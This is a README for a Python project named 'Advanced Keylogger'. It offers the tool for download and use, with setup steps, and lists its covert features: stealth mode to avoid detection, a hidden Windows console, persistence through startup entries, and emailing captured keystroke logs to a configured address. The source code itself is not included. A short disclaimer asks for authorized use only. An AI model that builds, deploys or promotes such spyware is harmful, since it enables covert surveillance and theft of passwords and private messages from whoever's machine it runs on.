# Advanced Keylogger

This Python script is an advanced keylogger that logs keystrokes with timestamps, starts in stealth mode, hides the console window on Windows, adds itself to startup, and sends an email with the log file attachment.

## Features

- Logs keystrokes with timestamps to a file (`log.txt`).
- Starts in stealth mode to avoid detection.
- Hides the console window on Windows.
- Adds itself to startup for persistent execution.
- Sends an email with the log file attachment using SMTP.

## Developer Information

- Developer: Syed Mansoor ul Hassan Bukhari
- GitHub Account: [cyberfantics](https://github.com/cyberfantics)

## Dependencies

- Python 3.x
- colorama
- pynput
- smtplib

## Usage

1. Clone the repository to your local machine:
   ```git clone https://github.com/cyberfantics/advanced-keylogger.git```
2. Navigate to the project directory:
  ```cd advanced-keylogger```
3. Install the required dependencies:
  ```pip install colorama pynput```
4. Set up the email configuration in the script:
  ```EMAIL_ADDRESS = "your_email@gmail.com"  # Replace with your email address
    EMAIL_PASSWORD = "your_email_password"  # Replace with your email password```
5.Run the script:
  ```python keylogger.py```
6. Allow necessary permissions if prompted, and the keylogger will start logging keystrokes.

## Note
  Use this script responsibly and only on authorized systems for educational or security testing purposes.
Be cautious about legal implications and privacy concerns related to keylogging activities.

## License
This project is licensed under the MIT License.

